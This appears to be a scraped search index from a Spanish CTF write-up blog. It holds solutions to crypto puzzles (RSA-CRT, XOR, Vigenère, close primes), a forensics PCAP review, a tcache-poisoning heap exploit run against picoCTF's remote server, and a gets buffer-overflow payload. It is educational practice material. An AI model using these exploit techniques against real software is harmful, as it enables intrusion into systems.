","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/ctf/imaginaryctf/box/","section":"ctf","summary":"ImaginaryCTF 15/09/2022. 50 puntos. Sistema de ecuaciones lineales","time":1,"title":"Box"},{"contents":"Se nos proporciona el siguiente archivo de texto (brainy.txt):\n++++++++++[++++++++++++++++++++++++++++++++++++++++++++.-----------.+.-------------.++++++++++++.------------.+++++++++++++.--------------.++++++++++++++++++++++++++.  Se trata de un lenguaje esotérico llamado Brainfuck. Si usamos una herramienta como www.tutorialspoint.com, podemos obtener el resultado:\nEn resumen, tenemos:\np = 7901324502264899236349230781143813838831920474669364339844939631481665770635584819958931021644265960578585153616742963330195946431321644921572803658406281 q = 12802918451444044622583757703752066118180068668479378778928741088302355425977192996799623998720429594346778865275391307730988819243843851683079000293815051 dp = 5540655028622021934429306287937775291955623308965208384582009857376053583575510784169616065113641391169613969813652523507421157045377898542386933198269451 dq = 9066897320308834206952359399737747311983309062764178906269475847173966073567988170415839954996322314157438770225952491560052871464136163421892050057498651 c = 62078086677416686867183857957350338314446280912673392448065026850212685326551183962056495964579782325302082054393933682265772802750887293602432512967994805549965020916953644635965916607925335639027579187435180607475963322465417758959002385451863122106487834784688029167720175128082066670945625067803812970871  $p$ y $q$ parecen parámetros para un criptosistema RSA, y $c$ debe ser el texto cifrado. Sin embargo, necesitamos saber qué son $dp$ y $dq$.\nDespués de un poco de investigación, descubrimos que se trata de una variante e RSA llamada RSA con CRT (más información en crypto.stackexchange.com).\nEntonces, tenemos parte de la clave privada. En RSA con CRT, la clave privada está formada por:\n Números primos $p$ y $q$ Luego $d_p = d \\pmod{p - 1}$ y $d_q = d \\pmod{q - 1}$ Y finalmente $q_\\mathrm{inv} = q^{-1} \\pmod{p}$  Para descifrar $c$, tenemos que realizar las siguientes operaciones (que aplican el Teorema Chino del Resto):\n$$ m_1 = c^{d_p} \\pmod{p} \\qquad m_2 = c^{d_q} \\pmod{q} $$\nLuego, hallamos un valor $h$ como\n$$ h = q_\\mathrm{inv} (m_1 - m_2) \\pmod{p} $$\nY obtenemos el mensaje en texto claro\n$$ m = m_2 + hq \\pmod{pg} $$\nTenemos todos los ingredientes para obtener $m$, vamos a hacer las operaciones en Python:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; p = 7901324502264899236349230781143813838831920474669364339844939631481665770635584819958931021644265960578585153616742963330195946431321644921572803658406281 \u0026gt;\u0026gt;\u0026gt; q = 12802918451444044622583757703752066118180068668479378778928741088302355425977192996799623998720429594346778865275391307730988819243843851683079000293815051 \u0026gt;\u0026gt;\u0026gt; dp = 5540655028622021934429306287937775291955623308965208384582009857376053583575510784169616065113641391169613969813652523507421157045377898542386933198269451 \u0026gt;\u0026gt;\u0026gt; dq = 9066897320308834206952359399737747311983309062764178906269475847173966073567988170415839954996322314157438770225952491560052871464136163421892050057498651 \u0026gt;\u0026gt;\u0026gt; c = 62078086677416686867183857957350338314446280912673392448065026850212685326551183962056495964579782325302082054393933682265772802750887293602432512967994805549965020916953644635965916607925335639027579187435180607475963322465417758959002385451863122106487834784688029167720175128082066670945625067803812970871 \u0026gt;\u0026gt;\u0026gt; m1 = pow(c, dp, p) \u0026gt;\u0026gt;\u0026gt; m2 = pow(c, dq, q) \u0026gt;\u0026gt;\u0026gt; h = pow(q, -1, p) * (m1 - m2) % p \u0026gt;\u0026gt;\u0026gt; m = (m2 + h * q) % (p * q) \u0026gt;\u0026gt;\u0026gt; bytes.fromhex(hex(m)[2:]) b'ch1n3z_r3m4ind3r_the0rem_r0ck$$$_9792'  Y la flag es: HTB{ch1n3z_r3m4ind3r_the0rem_r0ck$$$_9792}.\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/crypto/brainys-cipher/","section":"ctf","summary":"Brainfuck. RSA con CRT","time":1,"title":"Brainy's Cipher"},{"contents":"Se nos proporcionan estos caracteres:\nTCQ{rveyln'bH_varHuebcrqxetrHOXEj  Nos dicen que se ha utilizado un cifrado XOR, pero necesitamos descubrir la clave. Para esto, podemos realizar un ataque de fuerza bruta utilizando el módulo \u0026ldquo;XOR Brute Force\u0026rdquo; de CyberChef](https://gchq.github.io/CyberChef). Si filtramos por CTFlearn, obtenemos la clave y la flag:\nFlag: CTFlearn{y0u_Have_bruteforce_XOR}.\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/ctf/ctflearn/cryptography/bruxor/","section":"ctf","summary":"XOR. Fuerza bruta","time":0,"title":"BruXOR"},{"contents":"BuscarBusca por palabras clave en soluciones de CTF y HTB \u0026lt;- INICIO  Total: 0      let fuse const options = { findAllMatches: true, ignoreLocation: true, keys: ['title', 'summary', 'contents'], threshold: 0, } document.forms[0].addEventListener('submit', e = { e.preventDefault() executeSearch() }) function loadSearch() { fetch('\\/index.json').then(res = res.json()).then(data = { fuse = new Fuse(data, options) }) } function executeSearch() { const results = fuse.search(document.getElementById('search').value).filter(r = r.item.section !== 'imc') let searchitems = '' for (let result of results) { searchitems += `${result.item.section.toUpperCase()}${result.item.title}${result.item.summary}` } document.getElementById('searchResults').innerHTML = searchitems document.getElementById('post-count').innerText = results.length } loadSearch()  ","image":null,"permalink":"https://7rocky.github.io/search/","section":"","summary":null,"time":0,"title":"Buscar"},{"contents":"Se nos proporciona un binario de 64 bits llamado heapedit y un archivo libc.so.6 como librería externa:\nArch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'./'  Si ejecutamos el binario obtendremos una violación de segmento (segmentation fault):\n$ chmod +x heapedit $ ./heapedit zsh: segmentation fault (core dumped) ./heapedit  Está configurado para utilizar Glibc desde el directorio actual:\n$ ldd heapedit linux-vdso.so.1 (0x00007ffe8397e000) libc.so.6 = ./libc.so.6 (0x00007f9f134b0000) /lib64/ld-linux-x86-64.so.2 (0x00007f9f138a3000)  Usaremos pwninit para parchear el binario y hacer que funcione:\n$ pwninit --libc libc.so.6 --no-template --bin heapedit bin: heapedit libc: libc.so.6 fetching linker https://launchpad.net/ubuntu/+archive/primary/+files//libc6_2.27-3ubuntu1.2_amd64.deb unstripping libc https://launchpad.net/ubuntu/+archive/primary/+files//libc6-dbg_2.27-3ubuntu1.2_amd64.deb setting ./ld-2.27.so executable copying heapedit to heapedit_patched running patchelf on heapedit_patched  Y aún no funciona:\n$ ./heapedit_patched zsh: segmentation fault (core dumped) ./heapedit_patched  Vamos a utilizar ltrace para ver algunas llamadas a la librería:\n$ ltrace ./heapedit_patched setbuf(0x7fe7fa3ac760, 0) = \u0026lt;void\u0026gt; fopen(\"flag.txt\", \"r\") = 0 fgets( \u0026lt;no return ...\u0026gt; --- SIGSEGV (Segmentation fault) --- +++ killed by SIGSEGV +++  Y aquí está el problema, tenemos que crear una flag de pruebas para ejecutarlo correctamente:\n$ echo 'picoCTF{test_flag}' \u0026gt; flag.txt $ ./heapedit_patched You may edit one byte in the program. Address: 1 Value: 2 t help you: this is a random string.  Parece que el programa nos da una primitiva de \u0026ldquo;write-what-where\u0026rdquo; para un byte. Vamos a usar Ghidra para descompilar el binario y ver su código en C:\nint main() { long in_FS_OFFSET; char value; int address; int i; void *p_first_malloc; void *first_malloc; FILE *flag_file; void *second_malloc; void *last_malloc; undefined8 random_string; undefined8 local_70; undefined8 local_68; undefined local_60; char flag[72]; long local_10; local_10 = *(long *) (in_FS_OFFSET + 0x28); setbuf(stdout, (char *) 0x0); flag_file = fopen(\"flag.txt\", \"r\"); fgets(flag, 0x40, flag_file); /* this is */ random_string = 0x2073692073696874; /* a random */ local_70 = 0x6d6f646e61722061; /* string. */ local_68 = 0x2e676e6972747320; local_60 = 0; p_first_malloc = (void *) 0x0; for (i = 0; i \u0026lt; 7; i++) { first_malloc = malloc(0x80); if (p_first_malloc == (void *) 0x0) { p_first_malloc = first_malloc; } /* Congrats */ *(undefined8 *) first_malloc = 0x73746172676e6f43; /* ! Your f */ *(undefined8 *) ((long) first_malloc + 8) = 0x662072756f592021; /* lag is: */ *(undefined8 *) ((long) first_malloc + 0x10) = 0x203a73692067616c; *(undefined *) ((long) first_malloc + 0x18) = 0; strcat((char *) first_malloc,flag); } second_malloc = malloc(0x80); /* Sorry! T */ *(undefined8 *) second_malloc = 0x5420217972726f53; /* his won' */ *(undefined8 *) ((long) second_malloc + 8) = 0x276e6f7720736968; /* t help y */ *(undefined8 *) ((long) second_malloc + 0x10) = 0x7920706c65682074; /* ou: */ *(undefined4 *) ((long) second_malloc + 0x18) = 0x203a756f; *(undefined *) ((long) second_malloc + 0x1c) = 0; strcat((char *) second_malloc, (char *) \u0026amp;random_string); free(first_malloc); free(second_malloc); address = 0; value = '\\0'; puts(\"You may edit one byte in the program.\"); printf(\"Address: \"); __isoc99_scanf(\"%d\", \u0026amp;address); printf(\"Value: \"); __isoc99_scanf(\" %c\", \u0026amp;value); *(char *) ((long) address + (long) p_first_malloc) = value; last_malloc = malloc(0x80); puts((char *) ((long) last_malloc + 0x10)); if (local_10 != *(long *) (in_FS_OFFSET + 0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return 0; }  Está utilizando malloc para almacenar dos cadenas de caracteres en el heap. La flag corresponde al primer malloc, el segundo malloc se utiliza para un mensaje cualquiera (es decir, \u0026ldquo;Sorry! This won\u0026rsquo;t help you: this is a random string.\u0026rdquo;).\nEl binario también libera los chunks usando free. Y finalmente, llama otra vez a malloc, de manera que el último chunk que fue liberado será asignado, y después imprime la cadena de caracteres contenida.\nAquí el orden importa, ya que el último chunk liberado es el que contiene la cadena de caracteres cualquiera.\nEl programa nos da la oportunidad de modificar un único byte en una dirección dada, vamos a ver qué podemos hacer.\nUsaremos GDB para depurar el programa poniendo un breakpoint en puts:\n$ gdb -q heapedit_patched Reading symbols from heapedit_patched... (No debugging symbols found in heapedit_patched) gef➤ break puts Breakpoint 1 at 0x400690 gef➤ run Starting program: ./heapedit_patched Breakpoint 1, _IO_puts (str=0x400b18 \"You may edit one byte in the program.\") at ioputs.c:33  gef➤ heap chunks Chunk(addr=0x602010, size=0x250, flags=PREV_INUSE) [0x0000000000602010 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 00 ................] Chunk(addr=0x602260, size=0x230, flags=PREV_INUSE) [0x0000000000602260 88 24 ad fb 00 00 00 00 a3 24 60 00 00 00 00 00 .$.......$`.....] Chunk(addr=0x602490, size=0x1010, flags=PREV_INUSE) [0x0000000000602490 70 69 63 6f 43 54 46 7b 74 65 73 74 5f 66 6c 61 picoCTF{test_fla] Chunk(addr=0x6034a0, size=0x90, flags=PREV_INUSE) [0x00000000006034a0 43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66 Congrats! Your f] Chunk(addr=0x603530, size=0x90, flags=PREV_INUSE) [0x0000000000603530 43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66 Congrats! Your f] Chunk(addr=0x6035c0, size=0x90, flags=PREV_INUSE) [0x00000000006035c0 43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66 Congrats! Your f] Chunk(addr=0x603650, size=0x90, flags=PREV_INUSE) [0x0000000000603650 43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66 Congrats! Your f] Chunk(addr=0x6036e0, size=0x90, flags=PREV_INUSE) [0x00000000006036e0 43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66 Congrats! Your f] Chunk(addr=0x603770, size=0x90, flags=PREV_INUSE) [0x0000000000603770 43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66 Congrats! Your f] Chunk(addr=0x603800, size=0x90, flags=PREV_INUSE) [0x0000000000603800 00 00 00 00 00 00 00 00 21 20 59 6f 75 72 20 66 ........! Your f] Chunk(addr=0x603890, size=0x90, flags=PREV_INUSE) [0x0000000000603890 00 38 60 00 00 00 00 00 68 69 73 20 77 6f 6e 27 .8`.....his won'] Chunk(addr=0x603920, size=0x1f6f0, flags=PREV_INUSE) ← top chunk  Aquí vemos un montón de cosas. Primero, hay 2 chunks en el Tcache (que está representado por el o2 en el primer chunk de la salida). El Tcache es una lista enlazada de chunks liberados. Es utilizado por malloc para alocar chunks más rápidamente porque mirará si hay chunks en el Tcache antes de solicitar memoria al kernel.\nLa dirección del siguiente chunk que será asignado (la cabecera de la lista enlazada) es 0x603890:\ngef➤ x/20gx 0x602000 0x602000: 0x0000000000000000 0x0000000000000251 0x602010: 0x0200000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000603890 0x602090: 0x0000000000000000 0x0000000000000000  La salida anterior es el comienzo del espacio del heap. Este chunk es especial porque almacena la información que usa malloc para asignar chunks.\nVeamos qué hay en la cabecera del Tcache (realmente, 0x10 antes para ver los metadatos del chunk). Se trata de un chunk de 0x90 bytes (el 1 de 0x91 significa que el chunk anterior está en uso). Este contiene la cadena de caracteres cualquiera:\ngef➤ x/20gx 0x603880 0x603880: 0x0000000000000000 0x0000000000000091 0x603890: 0x0000000000603800 0x276e6f7720736968 0x6038a0: 0x7920706c65682074 0x73696874203a756f 0x6038b0: 0x6172206120736920 0x727473206d6f646e 0x6038c0: 0x000000002e676e69 0x0000000000000000 0x6038d0: 0x0000000000000000 0x0000000000000000 0x6038e0: 0x0000000000000000 0x0000000000000000 0x6038f0: 0x0000000000000000 0x0000000000000000 0x603900: 0x0000000000000000 0x0000000000000000 0x603910: 0x0000000000000000 0x000000000001f6f1 0x603920: 0x0000000000000000 0x0000000000000000 gef➤ x/s 0x603898 0x603898: \"his won't help you: this is a random string.\"  Vamos a continuar escribiendo un 0 en la dirección 0 y a ver qué pasa:\ngef➤ continue Continuing. You may edit one byte in the program. Address: 0 Value: 0 Breakpoint 1, _IO_puts (str=0x6038a0 \"t help you: this is a random string.\") at ioputs.c:33  gef➤ heap chunks Chunk(addr=0x602010, size=0x250, flags=PREV_INUSE) [0x0000000000602010 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 00 ................] Chunk(addr=0x602260, size=0x230, flags=PREV_INUSE) [0x0000000000602260 88 24 ad fb 00 00 00 00 a3 24 60 00 00 00 00 00 .$.......$`.....] Chunk(addr=0x602490, size=0x1010, flags=PREV_INUSE) [0x0000000000602490 70 69 63 6f 43 54 46 7b 74 65 73 74 5f 66 6c 61 picoCTF{test_fla] Chunk(addr=0x6034a0, size=0x90, flags=PREV_INUSE) [0x00000000006034a0 30 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66 0ongrats! Your f] Chunk(addr=0x603530, size=0x90, flags=PREV_INUSE) [0x0000000000603530 43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66 Congrats! Your f] Chunk(addr=0x6035c0, size=0x90, flags=PREV_INUSE) [0x00000000006035c0 43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66 Congrats! Your f] Chunk(addr=0x603650, size=0x90, flags=PREV_INUSE) [0x0000000000603650 43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66 Congrats! Your f] Chunk(addr=0x6036e0, size=0x90, flags=PREV_INUSE) [0x00000000006036e0 43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66 Congrats! Your f] Chunk(addr=0x603770, size=0x90, flags=PREV_INUSE) [0x0000000000603770 43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66 Congrats! Your f] Chunk(addr=0x603800, size=0x90, flags=PREV_INUSE) [0x0000000000603800 00 00 00 00 00 00 00 00 21 20 59 6f 75 72 20 66 ........! Your f] Chunk(addr=0x603890, size=0x90, flags=PREV_INUSE) [0x0000000000603890 00 38 60 00 00 00 00 00 68 69 73 20 77 6f 6e 27 .8`.....his won'] Chunk(addr=0x603920, size=0x410, flags=PREV_INUSE) [0x0000000000603920 30 0a 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0...............] Chunk(addr=0x603d30, size=0x1f2e0, flags=PREV_INUSE) ← top chunk  ¿Puedes ver la diferencia? Hay un 0ongrats! en lugar de Congrats!. Por tanto, la dirección donde estamos escribiendo es realmente un offset, y la dirección base es 0x6034a0:\ngef➤ grep 0ongrats [+] Searching '0ongrats' in memory [+] In '[heap]'(0x602000-0x623000), permission=rw- 0x6034a0 - 0x6034cc → \"0ongrats! Your flag is: picoCTF{test_flag}\\n\"  Además, puts está utilizando la cadena de caracteres en 0x6038a0, que es 0x603890 + 0x10, el código realiza esta operación:\nlast_malloc = malloc(0x80); puts((char *) ((long) last_malloc + 0x10));  Vamos a modificar 0x603890 en el Tcache para poner 0x603490 por ejemplo. Esto es, pondremos 0x34 como byte a escribir (que es 4 en ASCII).\nAhora tenemos que obtener la dirección donde está 0x603890 en el heap. Recordemos esta salida:\ngef➤ x/20gx 0x602000 0x602000: 0x0000000000000000 0x0000000000000251 0x602010: 0x0200000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000603890 0x602090: 0x0000000000000000 0x0000000000000000  La dirección exacta del byte 0x38 es 0x602089. Vamos a verificarlo:\ngef➤ x/c 0x602089 0x602089: 0x38  Perfecto, entonces el offset que necesitamos es 0x602089 - 0x6034a0 = -5143. Vamos a probar:\n$ gdb -q heapedit_patched Reading symbols from heapedit_patched... (No debugging symbols found in heapedit_patched) gef➤ run Starting program: ./heapedit_patched You may edit one byte in the program. Address: -5143 Value: 4 Congrats! Your flag is: picoCTF{test_flag} [Inferior 1 (process 295925) exited normally]  Funciona en GDB, pero no fuera:\n$ ./heapedit_patched You may edit one byte in the program. Address: -5143 Value: 4 zsh: segmentation fault (core dumped) ./heapedit_patched  Después de algún tiempo, me di cuenta de qué estaba pasando. El tema es que las direcciones del heap sufren ASLR, por lo que todas las direcciones son aleatorias a excepción de los últimos tres dígitos en hexadecimal (como ocurre con Glibc o los binarios con PIE). Como estamos modificando el tercer dígito y el cuarto dígito de una dirección, y eso no funcionará siempre.\nUna manera de solucionarlo es ejecutarlo varias veces:\n$ while true; do echo '-5143\\n4' | ./heapedit_patched; done | grep picoCTF Address: Value: Congrats! Your flag is: picoCTF{test_flag}  Y esto también funciona en la instancia remota:\n$ while true; do echo '-5143\\n4' | nc mercury.picoctf.net 8054; done | grep picoCTF Address: Value: Congrats! Your flag is: picoCTF{5c9838eff837a883a30c38001280f07d}  Existe una solución más elegante, que es modificar el primer dígito y el segundo dígito (que no cambiarán con ASLR). Por ejemplo, podemos modificar 0x603890 para que sea 0x603800 (que es la dirección del chunk anterior) en el ejemplo de arriba. También tenemos que restar 1 al offset (es decir -5144).\nY esto funciona siempre tanto en local como en remoto:\n$ echo '-5144\\n\\0' | ./heapedit_patched You may edit one byte in the program. Address: Value: lag is: picoCTF{test_flag} $ echo '-5144\\n\\0' | nc mercury.picoctf.net 8054 You may edit one byte in the program. Address: Value: lag is: picoCTF{5c9838eff837a883a30c38001280f07d}  ","image":"/images/pwn.png","permalink":"https://7rocky.github.io/ctf/picoctf/binary-exploitation/cache-me-outside/","section":"ctf","summary":"picoCTF 2021. 70 puntos. Binario de 64 bits. Explotación del heap. Tcache poisoning","time":8,"title":"Cache Me Outside"},{"contents":"Se nos proporcionan estos caracteres:\n43 54 46 6C 65 61 72 6E 7B 34 35 43 31 31 5F 31 35 5F 55 35 33 46 55 4C 7D  Como son todo números y letras entre A y F, parece que se trata de una codificación en ASCII hexadecimal.\nPor ejemplo, 0x43 es el código de la C, 0x54 es el de la T y 0x46 el de la F.\nPara decodificar todos los caracteres, podemos utilizar este \u0026ldquo;one-liner\u0026rdquo;:\n$ xxd -r -p \u0026lt;\u0026lt;\u0026lt; '43 54 46 6C 65 61 72 6E 7B 34 35 43 31 31 5F 31 35 5F 55 35 33 46 55 4C 7D' CTFlearn{45C11_15_U53FUL}  ","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/ctf/ctflearn/cryptography/character-encoding/","section":"ctf","summary":"Codificación ASCII hexadecimal","time":0,"title":"Character Encoding"},{"contents":"Se nos proporciona un archivo PCAP con mensajes HTTP y segmentos TCP:\nSi filtramos por el protocolo HTTP, veremos algunas peticiones y respuestas:\nPodríamos pensar que el cibercriminal encontró una vulnerabilidad de subida de archivo y subió un cmd.aspx y luego nc64.exe para ejecutar comandos. De hecho, podemos ver que el cibercriminal consiguió una reverse shell en la máquina Windows:\nAl final de la captura PCAP, vemos que el cibercriminal intenta acceder a un archivo llamado JBKEE62NIFXF6ODMOUZV6NZTMFGV6URQMNMH2IBA.txt que muestra Hey there!:\nLa clave aquí es que el nombre del archivo está codificado. Si lo metemos en CyberChef con una receta Magic, veremos que está codificado en Base32, y es la flag (HTB{MAn_8lu3_73aM_R0cX} ):\n","image":"/images/forensics.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/forensics/chase/","section":"ctf","summary":"Análisis de tráfico HTTP y TCP","time":0,"title":"Chase"},{"contents":"Se nos proporciona un texto cifrado:\nalp gwcsepul gtavaf, nlv prgpbpsu mb h jcpbyvdlq, ipltga rv glniypfa we ekl 16xs nsjhlcb. px td o lccjdstslpahzn fptspf xstlxzi te iosj ezv sc xcns ttsoic lzlvrmhaw ez sjqijsa xsp rwhr. tq vxspf sciov, alp wsphvcv pr ess rwxpqlvp nwlvvc dyi dswbhvo ef htqtafvyw hqzfbpg, ezutewwm zcep xzmyr o scio ry tscoos rd woi pyqnmgelvr vpm . qbctnl xsp akbflowllmspwt nlwlpcg, lccjdstslpahzn fptspfo oip qvx dfgysgelipp ec bfvbxlrnj ojocjvpw, ld akfv ekhr zys hskehy my eva dclluxpih yoe mh yiacsoseehk fj l gebxwh sieesn we ekl iynfudktru. xsp yam zd woi qwoc.  Podemos usar cipher-identifier y detectar que nos enfrentamos a un cifrado de Vigenère:\nEn la misma página, tenemos una herramienta vigenere-cipher que es capaz de extraer el texto claro y la clave:\nY la flag es: HTB{helloworld}.\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/crypto/classic-yet-complicated/","section":"ctf","summary":"Cifrado de Vigenère","time":0,"title":"Classic, yet complicated!"},{"contents":"Se nos dice que una implementación de RSA utiliza un número primo y el siguiente número primo. Tenemos el texto cifrado:\n4881495507745813082308282986718149515999022572229780274224400469722585868147852608187509420010185039618775981404400401792885121498931245511345550975906095728230775307758109150488484338848321930294974674504775451613333664851564381516108124030753196722125755223318280818682830523620259537479611172718588812979116127220273108594966911232629219195957347063537672749158765130948724281974252007489981278474243333628204092770981850816536671234821284093955702677837464584916991535090769911997642606614464990834915992346639919961494157328623213393722370119570740146804362651976343633725091450303521253550650219753876236656017  Y también el código fuente:\nfrom Crypto.Util.number import getPrime, bytes_to_long from Crypto.PublicKey import RSA from secret import flag, getNextPrime p = getPrime(1024) q = getNextPrime(p) n = p * q e = 65537 key = RSA.construct((n, e)).export_key().decode() with open(\"key\", \"w\") as f: f.write(key) m = bytes_to_long(flag.encode()) c = pow(m, e, n) print(f\"c = {c}\")  Nótese que no tenemos la función getNextPrime. Además, se nos proporciona la clave pública en formato PEM:\n-----BEGIN PUBLIC KEY----- MIIBITANBgkqhkiG9w0BAQEFAAOCAQ4AMIIBCQKCAQBKS/xOueb8SyhYskLwm2DT hofceXDq73pNlu7CAwf1rTYFfYUgbiaKqkOfyTDurLOVXhWnwcmCRo9HwUUEyHG3 swXS5OoSGmHHplMv8crTLlY+/hCpEFnLSPDcnl7HI7a/oprKpCgeiZOphEiIhm8x UQqivWqZvGzeV9EfjeaAaPlztu3nuRyfccMjqozreU20f8SNSa9wD6vKqtAgvjv3 VapvlRVHRfPvlWCr09VE8W1qzdWvk0XWnyihd+3ssCgKBXpirylAT1WWZk6d3Ryq bh7biTpeVqzovEFZpQrm2T8Ym6TMRkbImLo9ObEOyVvP3TyUOUtalgDh1iaqHWkn AgMBAAE= -----END PUBLIC KEY-----  Podemos extraer $n$ y $e$ de este archivo (aunque ya sabemos que $e = 65537$). Luego, la idea es calcular $\\sqrt{n}$, ya que sabemos que $n = p \\cdot q$ y $p$ y $q$ son cercanos (podemos deducir que son números primos consecutivos).\nEntonces, una vez que tengamos $\\sqrt{n}$, podemos empezar a reducir el resultado hasta que tengamos un número primo. Después, solo tenemos que aumentarlo para encontrar el siguiente número primo.\nUna vez que tenemos los dos números primos $p$ y $q$, el descifrado de RSA es trivial.\nAquí tenemos un script en Python que resuelve el reto:\n#!/usr/bin/env python3 from Crypto.Util.number import isPrime from Crypto.PublicKey import RSA from gmpy2 import iroot c = 4881495507745813082308282986718149515999022572229780274224400469722585868147852608187509420010185039618775981404400401792885121498931245511345550975906095728230775307758109150488484338848321930294974674504775451613333664851564381516108124030753196722125755223318280818682830523620259537479611172718588812979116127220273108594966911232629219195957347063537672749158765130948724281974252007489981278474243333628204092770981850816536671234821284093955702677837464584916991535090769911997642606614464990834915992346639919961494157328623213393722370119570740146804362651976343633725091450303521253550650219753876236656017 with open('key') as f: key = RSA.import_key(f.read()) n = key.n e = key.e def get_next_prime(prime: int) -\u0026gt; int: test = prime + 2 while not isPrime(test): test += 2 return test while True: p, _ = iroot(n, 2) while not isPrime(p): p -= 2 q = get_next_prime(p) n = p * q phi_n = (p - 1) * (q - 1) d = pow(e, -1, phi_n) p = pow(c, d, n) if b'SEE{'.hex() in hex(p): print(bytes.fromhex(hex(p)[2:]).decode()) break  $ python3 solve.py SEE{i_love_really_secure_algorithms_b5c0b187fe309af0f4d35982fd961d7e}  El script completo se puede encontrar aquí: solve.py.\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/ctf/other/close-enough/","section":"ctf","summary":"SEETF 2022. RSA. Implementación incorrecta","time":1,"title":"Close Enough"},{"contents":"Se nos proporciona un binario de 64 bits llamado chall:\nArch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)  Tenemos también el código fuente en C. Básicamente, lo que hace el programa es llamar a la función gets y después comparar una variable local (code) con el valor de una variable global (GOAL):\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #define SIZE 0x100 #define GOAL 0xdeadbeef const char* HEADER = \"...\"; int main() { long code = 0; char clutter[SIZE]; setbuf(stdout, NULL); setbuf(stdin, NULL); setbuf(stderr, NULL); puts(HEADER); puts(\"My room is so cluttered...\"); puts(\"What do you see?\"); gets(clutter); if (code == GOAL) { printf(\"code == 0x%llx: how did that happen??\\n\", GOAL); puts(\"take a flag for your troubles\"); system(\"cat flag.txt\"); } else { printf(\"code == 0x%llx\\n\", code); printf(\"code != 0x%llx :(\\n\", GOAL); } return 0; }  La idea es simple: gets es vulnerable a Buffer Overflow, por lo que podemos escribir datos en la pila (stack). De esta manera, podemos sobrescribir el valor de la variable code.\nVamos a verlo con GDB:\n$ gdb -q chall Reading symbols from chall... (No debugging symbols found in chall) gef➤ disassemble main ... 0x000000000040074c : call 0x4005d0 \u0026lt;gets@plt\u0026gt; 0x0000000000400751 : mov eax,0xdeadbeef 0x0000000000400756 : cmp QWORD PTR [rbp-0x8],rax 0x000000000040075a : jne 0x40078c \u0026lt;main+197\u0026gt; ... End of assembler dump.  Se ve que la variable local code se almacena en $rbp - 0x8. Entonces, tenemos que calcular el número de caracteres para controlar el registro $rbp utilizando un patrón. Este patrón debe tener más de 256 caracteres (0x100), ya que esta es la longitud del buffer que tiene asignado según el código fuente:\ngef➤ pattern create 300 [+] Generating a pattern of 300 bytes (n=8) aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaa aauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa [+] Saved as '$_gef0' gef➤ run Starting program: ./chall My room is so cluttered... What do you see? aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaa aauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa code == 0x6261616161616169 code != 0xdeadbeef :( Program received signal SIGSEGV, Segmentation fault. 0x00000000004007c0 in main ()  gef➤ pattern offset $rbp [+] Searching for '$rbp' [+] Found at offset 272 (little-endian search) likely  Perfecto, necesitamos 272 bytes para llegar a $rbp. Por tanto, necesitamos 264 (272 - 8) para llegar a la variable que queremos modificar. Después de los 264 caracteres, hay que poner 0xdeadbeef en formato little-endian para pasar la comparación y leer la flag:\n$ (python3 -c 'import sys; sys.stdout.write(\"A\" * 264)'; echo -e '\\xef\\xbe\\xad\\xde') | ./chall ______________________________________________________________________ |^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^| | ^ ^ ^ ^ ^ ^| L 